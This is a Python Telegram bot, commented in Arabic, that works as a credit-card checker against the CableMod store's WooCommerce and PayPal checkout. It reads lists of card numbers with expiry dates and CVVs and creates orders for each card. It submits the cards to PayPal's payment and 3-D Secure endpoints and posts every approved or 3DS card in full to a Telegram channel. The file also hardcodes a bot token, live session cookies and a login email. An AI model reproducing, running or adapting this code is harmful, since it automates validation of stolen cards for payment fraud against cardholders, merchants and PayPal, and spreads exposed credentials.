# -*- coding: utf-8 -*-
"""
CableMod + PayPal PPCP - Telegram Bot (مع تحديث كل 50 كرت)
"""

import os
import re
import json
import time
import asyncio
import threading
import requests
from datetime import datetime
from urllib.parse import urlencode, unquote
from typing import Optional, Dict, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters

# ====== إعدادات البوت ======
BOT_TOKEN = "7458997340:AAEKGFvkALm5usoFBvKdbGEs4b2dz5iSwtw"
ADMIN_IDS = [5895491379, 844663875]  # أدمن
CHANNEL_ID = -1003154179190  # القناة

# ====== إعدادات الموقع ======
BASE_URL = "https://store.cablemod.com/"
CHECKOUT_URL = BASE_URL + "checkout/"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
REFRESH_EVERY = 50  # تحديث كل 50 كرت

# الكوكيز الثابتة
INITIAL_COOKIES = {
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_first_add': 'fd%3D2025-10-28%2023%3A18%3A01%7C%7C%7Cep%3Dhttps%3A%2F%2Fcablemod.com%2F%3Fsrsltid%3DAfmBOopmJLOE7dLnPJqAwLhnyEQX4ZbFfElY8vnAAnYtUIEPHpXB5z6M%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
    'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%2010%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F141.0.0.0%20Safari%2F537.36',
    '_fbp': 'fb.1.1761693482072.783059716330931642',
    '_ga': 'GA1.1.543617456.1761693483',
    'woocommerce_items_in_cart': '1',
    'woocommerce_recently_viewed': '1902265',
    'wordpress_logged_in_ed7813b5c1349c2f14d2f89aad48ec92': 'i0ket57dzb%7C1762908222%7Cjsh0lltx9PceoroQvpEOSGJ37HkKuBm16DRVujmwwjq%7C58f193d4befcde327b8e1a1c0d16308a4974ce1e013aa70c85fffedd81ffc6eb',
    'wp_woocommerce_session_ed7813b5c1349c2f14d2f89aad48ec92': '114471%7C1761866332%7C1761779932%7C%24generic%24FzmPQxa-1erHcRmPGoP-Y-huTFjZ7ndfiApBJIEk',
    '_gcl_au': '1.1.1373112383.1761693482.1617057511.1761696403.1761698675',
    'woocommerce_cart_hash': '59b29a9c285b9235836a077996070a0f',
}

PAYPAL_COOKIES = {
    'enforce_policy': 'ccpa',
    'cookie_check': 'yes',
    'd_id': '52077666bd0b44258e7657ae8cb8e5bf1761605157957',
    'login_email': 'margiefos.ter7.0.1.83%40gmail.com',
    'LANG': 'en_US%3BUS',
    'TfXMWj95u2_Zf1Kmv_GCUOjlGG8': 'cvD9-96tABIM4Poym3Ti_T78QGNFcJqhBbQe6D-SUPN4BoQVLfICsIfqObYSm3dzZYYtVa63PS6nuoeXinbmhrH6XnOKBMtvuyX5LYdoN7rYG238yRymHuXF8Q-TSLrnAOv9ATNFCL6S0sWU4yz8V4YI6BSqFbRrz1sWKn1yrjv30AfGgvb78qo3usq',
    'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
    'ui_experience': 'did_set%3Dtrue%26login_type%3DEMAIL_PASSWORD%26home%3D3',
    'fn_dt': 'f78a16c47c9a4c31a4c9ea7903c6f1d4',
    'rmuc': 'OwAwuW-Vyed6BRvi6Gkk7ORgUHzp-64GENTf3U0lSkV1sce6mM5SWN7M_YuVXfAa0Kqm_3PdFZOnMPhElXeoL0iHiuPG9PH2YPVEmyT_4z6ArEMEVw3wl1_c9Zokod5ye545H5nGUQ0j9oO8bp_DpNmM1ZuOGh_5MU7GuWJHEo300CPO1ksqDrUAkprfnM9X3k3B0aECgQbDPcotu9fm0tfd8um',
    'X-PP-ADS': 'AToBEvb.aFi8BXurJKvSIyunxGo.bh47ASv2.2j-Pe0CHD41-xAGV-C9M-teOwEd9.9oaVKC36uQwjNZd7J2OptS1w',
    'nsid': 's%3AeeYy88H2oBb9GbcyszOjKk2QbiAGb9hq.WvuvZARfWO4Bk7bXI1S%2FSIxWTD%2BuYOU0h%2Bhh4anVXsA',
    '_ga': 'GA1.1.948625281.1761605189',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'whZ4Q-pT4zAOWrP5smSLQG-PjwjkfC-cCGONV1Xs6zrY3Z4Rn4C4XqDefGl3duxYq80A-5UFoTV78teM',
    'sc_f': 'UkcitVVSun6MogqMKdSPNRHq7u29vzA5Yp02abKnWu0PRTCwph8jJpmSUJDogTGs4H_1gWPJO6jMwQVuXnmhSbj1613ODnFW5ckSiW',
}

# بيانات الفاتورة
BILLING = {
    "billing_first_name": "saad",
    "billing_last_name": "saad",
    "billing_country": "US",
    "billing_address_1": "111 North Street",
    "billing_city": "Napoleon",
    "billing_state": "AK",
    "billing_postcode": "49261-9011",
    "billing_email": "i0ket57dzb@illubd.com",
}

SHIPPING = {
    "country": "US",
    "state": "AK",
    "postcode": "49261-9011",
    "city": "Napoleon",
    "address": "111 North Street",
    "address_2": ""
}

PAYMENT_METHOD = "ppcp-credit-card-gateway"

# ====== إحصائيات ======
stats = {
    'total': 0, 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0,
    'start_time': None, 'is_running': False, 'dashboard_message_id': None, 'current_card': '',
    'last_response': 'Waiting...', 'cards_checked': 0,
    'approved_cards': [], '3ds_cards': [], 'declined_cards': []
}

# ====== دالات مساعدة ======
def find(text: str, pattern: str, flags=re.S) -> Optional[str]:
    m = re.search(pattern, text, flags)
    return m.group(1) if m else None

def extract_nonces(html: str) -> Dict[str, Optional[str]]:
    nonces = {}
    nonces["update_order_review_nonce"] = find(html, r'update_order_review_nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I) or find(html, r'name=["\']update_order_review_nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
    nonces["process_checkout_nonce"] = find(html, r'woocommerce-process-checkout-nonce["\']\s*:\s*["\']([a-f0-9]+)["\']', re.I) or find(html, r'name=["\']woocommerce-process-checkout-nonce["\']\s+value=["\']([a-f0-9]+)["\']', re.I)
    nonces["ppcp_nonce"] = find(html, r'"nonce"\s*:\s*"([^"]+)"', re.S)
    nonces["create_order_nonce"] = find(html, r'"ppc-create-order"\s*:\s*\{[^}]*"nonce"\s*:\s*"([^"]+)"') or nonces["ppcp_nonce"]
    return nonces

def parse_card(card_str: str) -> Tuple[str, str, str, str]:
    parts = card_str.strip().split('|')
    if len(parts) != 4: raise ValueError("تنسيق خاطئ")
    number, month, year, cvv = parts
    number = number.strip()
    month = month.strip().zfill(2)
    year = year.strip()
    cvv = cvv.strip().zfill(3)
    if len(number) < 13 or len(number) > 19: raise ValueError("رقم خاطئ")
    if len(cvv) < 3 or len(cvv) > 4: raise ValueError("CVV خاطئ")
    if len(year) != 4 or not (1 <= int(month) <= 12): raise ValueError("تاريخ خاطئ")
    return number, cvv, year, month

# ====== معالج الدفع ======
class WooCommercePayPal:
    def __init__(self):
        self.sess = requests.Session()
        self.sess.cookies.update(INITIAL_COOKIES)
        self.paypal_sess = requests.Session()
        self.paypal_sess.cookies.update(PAYPAL_COOKIES)
        self.nonces = {}
        self.access_token = None
        self.wp_session = None
        self.paypal_order_id = None
        self.client_metadata_id = None

    def headers_get(self): return {"user-agent": UA, "referer": BASE_URL + "cart/"}
    def headers_ajax(self, json_content=False):
        h = {"user-agent": UA, "origin": BASE_URL.rstrip("/"), "referer": CHECKOUT_URL, "x-requested-with": "XMLHttpRequest"}
        h["content-type"] = "application/json" if json_content else "application/x-www-form-urlencoded; charset=UTF-8"
        return h

    def refresh_checkout_data(self):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] تحديث بيانات...")
        r = self.sess.get(CHECKOUT_URL, headers=self.headers_get(), timeout=30)
        self.nonces = extract_nonces(r.text)
        post_data = {"payment_method": PAYMENT_METHOD, **BILLING, "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", "")}
        payload = {"security": self.nonces["update_order_review_nonce"], "payment_method": PAYMENT_METHOD, "has_full_address": "true", **SHIPPING, "post_data": urlencode(post_data)}
        self.sess.post(BASE_URL, params={"wc-ajax": "update_order_review"}, headers=self.headers_ajax(), data=urlencode(payload), timeout=30)
        r_token = self.sess.post(BASE_URL, params={"wc-ajax": "ppc-data-client-id"}, headers=self.headers_ajax(True), json={"nonce": self.nonces["ppcp_nonce"]}, timeout=30)
        self.access_token = r_token.json().get("access_token")
        if not self.access_token:
            r_btn = self.paypal_sess.get("https://www.paypal.com/smart/buttons?clientID=Abf7famM34IoBZ5AgmTVk2Jfr7cEGOYYSIRvLlkSsrql09p3frXjC-WfFdXxsRkJEVIy_HG35IPnNzbk&currency=USD&intent=capture&commit=true&vault=false&components.0=buttons&components.1=card-fields&locale.country=US&locale.lang=en&env=production&platform=desktop", headers={"user-agent": UA, "referer": BASE_URL}, timeout=30)
            self.access_token = find(r_btn.text, r'"facilitatorAccessToken":"([^"]+)"')
        for c in self.sess.cookies:
            if c.name.startswith("wp_woocommerce_session_"):
                self.wp_session = unquote(c.value).split("|")[0]
                break
        print(f"[{datetime.now().strftime('%H:%M:%S')}] تم التحديث")

    def create_order(self):
        form_encoded = urlencode({
            "billing_first_name": BILLING["billing_first_name"], "billing_last_name": BILLING["billing_last_name"], "billing_email": BILLING["billing_email"],
            "billing_country": BILLING["billing_country"], "billing_address_1": BILLING["billing_address_1"], "billing_city": BILLING["billing_city"],
            "billing_state": BILLING["billing_state"], "billing_postcode": BILLING["billing_postcode"], "shipping_method[0]": "flexible_shipping_single:27",
            "payment_method": PAYMENT_METHOD, "terms": "on", "woocommerce-process-checkout-nonce": self.nonces.get("process_checkout_nonce", "")
        })
        payload = {
            "nonce": self.nonces.get("create_order_nonce", ""), "payer": {"email_address": BILLING["billing_email"], "name": {"surname": BILLING["billing_last_name"], "given_name": BILLING["billing_first_name"]},
            "address": {"country_code": BILLING["billing_country"], "address_line_1": BILLING["billing_address_1"], "admin_area_1": BILLING["billing_state"], "admin_area_2": BILLING["billing_city"], "postal_code": BILLING["billing_postcode"]}},
            "bn_code": "Woo_PPCP", "context": "checkout", "payment_method": PAYMENT_METHOD, "form_encoded": form_encoded
        }
        r = self.sess.post(BASE_URL, params={"wc-ajax": "ppc-create-order"}, headers=self.headers_ajax(True), json=payload, timeout=30)
        result = r.json()
        if result.get("success"):
            self.paypal_order_id = result["data"]["id"]
            self.client_metadata_id = result["data"].get("custom_id", f"pcp_customer_{self.wp_session}")
            return True
        return False

    def confirm_payment(self, card_number, cvv, year, month):
        headers = {'accept': 'application/json', 'content-type': 'application/json', 'user-agent': UA, 'origin': 'https://www.paypal.com', 'referer': 'https://www.paypal.com/smart/card-field', 'authorization': f'Bearer {self.access_token}'}
        if self.client_metadata_id: headers.update({'paypal-client-metadata-id': self.client_metadata_id, 'paypal-partner-attribution-id': 'Woo_PPCP'})
        payload = {'payment_source': {'card': {'number': card_number, 'security_code': cvv, 'expiry': f'{year}-{month}'}}}
        r = self.paypal_sess.post(f'https://www.paypal.com/v2/checkout/orders/{self.paypal_order_id}/confirm-payment-source', headers=headers, json=payload, timeout=30)
        return r.json()

    def verify_3ds(self):
        headers = {'accept': '*/*', 'content-type': 'application/json', 'user-agent': UA, 'origin': 'https://www.paypal.com', 'referer': f'https://www.paypal.com/heliosnext/threeDS?cart_id={self.paypal_order_id}'}
        self.paypal_sess.post('https://www.paypal.com/heliosnext/api/session', headers=headers, json={'token': self.paypal_order_id, 'action': 'verify'}, timeout=30)
        lookup_payload = {'token': self.paypal_order_id, 'action': 'verify', 'deviceInfo': {'windowSize': '_500_x_600', 'javaEnabled': False, 'language': 'ar', 'colorDepth': 24, 'screenHeight': 535, 'screenWidth': 450, 'userAgent': UA, 'timeZoneOffset': -180, 'deviceInfo': 'COMPUTER'}}
        print(f"[{datetime.now().strftime('%H:%M:%S')}] جاري Lookup...")
        r = self.paypal_sess.post('https://www.paypal.com/heliosnext/api/lookup', headers=headers, json=lookup_payload, timeout=30)
        res = r.json()
        print(f"[{datetime.now().strftime('%H:%M:%S')}] 3DS: {res.get('threeDSStatus')}")
        return res

# ====== فحص بطاقة ======
async def check_card(card: str, processor: WooCommercePayPal, bot_app):
    try:
        stats['checking'] = 1
        number, cvv, year, month = parse_card(card)
        stats['current_card'] = f"{number[:6]}******{number[-4:]}"
        await update_dashboard(bot_app)
        if not processor.create_order(): raise Exception("فشل الطلب")
        await asyncio.sleep(0.5)
        result = processor.confirm_payment(number, cvv, year, month)
        status = result.get("status")
        if status in ("APPROVED", "COMPLETED"):
            stats['approved'] += 1; stats['last_response'] = 'APPROVED'; stats['approved_cards'].append(card)
            await send_to_channel(bot_app, card, "APPROVED", "Approved")
        elif status == "PAYER_ACTION_REQUIRED":
            res = processor.verify_3ds()
            s3ds = res.get("threeDSStatus")
            if s3ds == "SUCCESS" and res.get("liability_shift") == "POSSIBLE":
                stats['approved'] += 1; stats['last_response'] = 'APPROVED'; stats['approved_cards'].append(card)
                await send_to_channel(bot_app, card, "APPROVED", "Approved")
            elif s3ds == "CHALLENGE_REQUIRED":
                stats['secure_3d'] += 1; stats['last_response'] = 'CHALLENGE'; stats['3ds_cards'].append(card)
                await send_to_channel(bot_app, card, "3D_SECURE", "CHALLENGE_REQUIRED")
            elif s3ds == "DECLINED":
                stats['rejected'] += 1; stats['last_response'] = 'DECLINED'; stats['declined_cards'].append(card)
            else:
                stats['secure_3d'] += 1; stats['last_response'] = f'3DS: {s3ds}'; stats['3ds_cards'].append(card)
                await send_to_channel(bot_app, card, "3D_SECURE", s3ds)
        else:
            stats['rejected'] += 1; stats['last_response'] = 'DECLINED'; stats['declined_cards'].append(card)
    except Exception as e:
        stats['errors'] += 1; stats['last_response'] = f'ERR: {str(e)[:15]}'; stats['declined_cards'].append(card)
    finally:
        stats['checking'] = 0
        await update_dashboard(bot_app)

# ====== قناة + داشبورد + ملفات ======
async def send_to_channel(bot_app, card, typ, msg):
    try:
        count = stats['approved'] + stats['secure_3d']
        text = f"{'APPROVED' if typ=='APPROVED' else '3D SECURE'} CARD\n\n`{card}`\nStatus: **{msg}**\nCard #{count}\nGateway: **CableMod + PayPal**\nMahmoud Saad"
        await bot_app.bot.send_message(CHANNEL_ID, text, parse_mode='Markdown')
    except: pass

def create_dashboard_keyboard():
    elapsed = int((datetime.now() - stats['start_time']).total_seconds()) if stats['start_time'] else 0
    h, m = divmod(elapsed // 60, 60); s = elapsed % 60
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(f"الإجمالي: {stats['total']}", "total")],
        [InlineKeyboardButton(f"فحص: {stats['checking']}", "checking"), InlineKeyboardButton(f"{h:02d}:{m:02d}:{s:02d}", "time")],
        [InlineKeyboardButton(f"Approved: {stats['approved']}", "approved"), InlineKeyboardButton(f"Declined: {stats['rejected']}", "rejected")],
        [InlineKeyboardButton(f"3DS: {stats['secure_3d']}", "3ds"), InlineKeyboardButton(f"Errors: {stats['errors']}", "errors")],
        [InlineKeyboardButton(f"Resp: {stats['last_response']}", "response")],
        [InlineKeyboardButton("إيقاف", "stop_check")] if stats['is_running'] else [],
        [InlineKeyboardButton(stats['current_card'], "current")] if stats['current_card'] else []
    ])

async def update_dashboard(bot_app):
    if stats['dashboard_message_id']:
        try:
            await bot_app.bot.edit_message_text(CHANNEL_ID, stats['dashboard_message_id'], "**CABLEMOD + PAYPAL - LIVE**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
        except: pass

async def send_final_files(bot_app):
    for name, lst, cap in [("approved", stats['approved_cards'], "Approved"), ("3ds", stats['3ds_cards'], "3D Secure"), ("declined", stats['declined_cards'], "Declined")]:
        if lst:
            with open(f"{name}_cards.txt", "w") as f: f.write("\n".join(lst))
            await bot_app.bot.send_document(CHANNEL_ID, open(f"{name}_cards.txt", "rb"), caption=f"**{cap} Cards** ({len(lst)})", parse_mode='Markdown')
            os.remove(f"{name}_cards.txt")

async def process_cards(cards, bot_app):
    processor = WooCommercePayPal()
    processor.refresh_checkout_data()
    for i, card in enumerate(cards):
        if not stats['is_running']: break
        await check_card(card, processor, bot_app)
        stats['cards_checked'] += 1
        if (i + 1) % REFRESH_EVERY == 0:
            processor.refresh_checkout_data()
        if stats['cards_checked'] % 3 == 0: await update_dashboard(bot_app)
        await asyncio.sleep(1.5)
    stats['is_running'] = False; stats['last_response'] = 'اكتمل'
    await update_dashboard(bot_app)
    await send_final_files(bot_app)
    await bot_app.bot.send_message(CHANNEL_ID, "**اكتمل الفحص!**\nتم إرسال الملفات", parse_mode='Markdown')

# ====== معالجات البوت ======
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: await update.message.reply_text("غير مصرح"); return
    await update.message.reply_text("**CableMod + PayPal Checker**\nأرسل ملف .txt (CC|MM|YYYY|CVV)", parse_mode='Markdown')

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ADMIN_IDS: await update.message.reply_text("غير مصرح"); return
    if stats['is_running']: await update.message.reply_text("فحص جاري!"); return
    file = await update.message.document.get_file()
    cards = [c.strip() for c in (await file.download_as_bytearray()).decode('utf-8').split('\n') if c.strip()]
    stats.update({'total': len(cards), 'checking': 0, 'approved': 0, 'rejected': 0, 'secure_3d': 0, 'errors': 0, 'current_card': '', 'last_response': 'بدء...', 'cards_checked': 0, 'approved_cards': [], '3ds_cards': [], 'declined_cards': [], 'start_time': datetime.now(), 'is_running': True})
    msg = await context.application.bot.send_message(CHANNEL_ID, "**بدء الفحص...**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
    stats['dashboard_message_id'] = msg.message_id
    await update.message.reply_text(f"بدأ الفحص: {len(cards)} كرت\nتحديث كل {REFRESH_EVERY} كرت")
    threading.Thread(target=lambda: asyncio.new_event_loop().run_until_complete(process_cards(cards, context.application)), daemon=True).start()

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id not in ADMIN_IDS: return
    await q.answer()
    if q.data == "stop_check": stats['is_running'] = False; await q.message.reply_text("تم الإيقاف!")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    app.add_handler(CallbackQueryHandler(button_callback))
    print("البوت يعمل...")
    app.run_polling()

if __name__ == "__main__":
    main()
